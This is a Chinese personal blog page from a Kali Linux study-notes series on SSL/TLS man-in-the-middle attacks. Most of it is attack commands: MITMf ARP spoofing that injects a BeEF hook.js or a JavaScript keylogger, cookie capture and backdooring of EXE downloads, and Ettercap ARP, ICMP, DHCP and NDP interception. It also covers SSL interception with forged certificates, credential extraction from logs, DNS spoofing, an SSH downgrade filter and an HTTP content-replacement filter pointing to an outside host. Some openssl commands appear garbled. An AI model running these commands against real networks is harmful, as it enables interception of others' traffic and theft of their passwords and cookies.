<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/default.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Tomas">
  <meta name="keywords" content="">
  <title>Kali Linux笔记(五十八)：SSL、TLS中间人攻击--注入XSS - Tomas&#39;Blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link  rel="stylesheet" href="/lib/prettify/tomorrow.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- 自定义样式保持在最底部 -->


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Tomas'Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/index.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期五, 一月 24日 2020, 3:08 下午
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    1.8k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      8 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
              <p
                class="note note-warning">本文最后更新于：星期六, 一月 25日 2020, 2:04 下午</p>
            
            <div class="markdown-body">
              <hr>
<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
<li>注入XSS<ul>
<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
<li>一旦得手，影响范围巨大 </li>
<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
</ul>
</li>
</ul>
<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>启动beef <ul>
<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（结合Beef）<ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
<li>–hsts（新的安全协议）<ul>
<li>HTTP Strict Transport Security </li>
<li>防止协议降级、cookie窃取 </li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
<li>限制user-agent、https等</li>
</ul>
</li>
<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
<li>凌空插后门 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
<li>统一的中间人攻击工具 </li>
<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
<li>支持SSH1、SSL中间人攻击</li>
</ul>
</li>
<li>模块划分 <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
<li>Snifer<ul>
<li>负责数据包转发</li>
<li>Unified<ul>
<li>单网卡情况下独立完成三层包转发</li>
<li>始终禁用内核IP_Forward功能</li>
</ul>
</li>
<li>Bridge <ul>
<li>双网卡情况下的一层MITM模式</li>
<li>可作为IPS过滤数据包</li>
<li>不可在网关上使用（透明网桥）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
<li>MITM <ul>
<li>把流量重定向到ettercap主机上 </li>
<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
</li>
<li>实现MITM的方法 <ul>
<li>ARP（一般为动态类型的ARP表）</li>
<li>ICMP <ul>
<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
</ul>
</li>
<li>DHCP <ul>
<li>修改网关地址，半双工，回包不经过Kali</li>
<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
</ul>
</li>
<li>Switch Port Stealing（交换机端口窃取）<ul>
<li>交换机根据源MAC地址更新</li>
<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6协议欺骗技术</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
<li>Ettercap使用ARP request包进行攻击 </li>
</ul>
</li>
<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
<li>用户操作界面 <ul>
<li>-T 文本界面（文本字符）</li>
<li>-G 图形界面 </li>
<li>-C 基于文本的图形界面（文本类似图形化）</li>
<li>-D 后台模式 </li>
</ul>
</li>
<li>指定目标 <ul>
<li>IPv4：MAC/IPv4/Ports </li>
<li>IPv6：MAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
</ul>
</li>
<li>权限 <ul>
<li>主配置文件：/etc/ettercap/etter.conf</li>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
<li>日志写入目录需要nobody有写入权 </li>
<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>基于伪造证书的SSL MITIM <ul>
<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
<li>参数<ul>
<li>-M（MITM技术）</li>
<li>-F（过滤器）</li>
<li>-P（模块）</li>
<li>-w（网络流量记录）</li>
<li>-l（简单记录日志）</li>
<li>-L（记录所有日志信息）</li>
<li>-m（账号密码信息）</li>
<li>-q（安静模式/有用的信息）</li>
</ul>
</li>
<li>MITM攻击<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap字符界面</li>
</ul>
</li>
<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
<li>DNS欺骗（图形界面） <ul>
<li>dns_spoof插件配置文件 </li>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
<li>DNS欺骗（字符界面）<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
</ul>
</li>
<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
</ul>
<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) { 
     msg(&quot;data on TCP 80\n&quot;); 
         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); 
     }</code></pre>
            </div>
            <hr>
            <div>
              <p>
                
                  <span>
                <i class="iconfont icon-inbox"></i>
                    
                      <a class="hover-with-bg" href="/categories/Kali/">Kali</a>
                      &nbsp;
                    
                  </span>&nbsp;&nbsp;
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8/">安全</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                      <a href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/">
                        <i class="fa fa-chevron-left"></i>
                        <span class="hidden-mobile">Kali Linux笔记(五十二)：XSS</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/">
                        <span class="hidden-mobile">Kali Linux笔记(五十七)：AJAX、Web Server</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-md">
    <div class="container custom post-content mx-auto">
      <h3>你好，Tomas，生命仍在继续......</h3>
    </div>
  </div>


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>





  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>





  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "Kali Linux笔记(五十八)：SSL、TLS中间人攻击--注入XSS&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
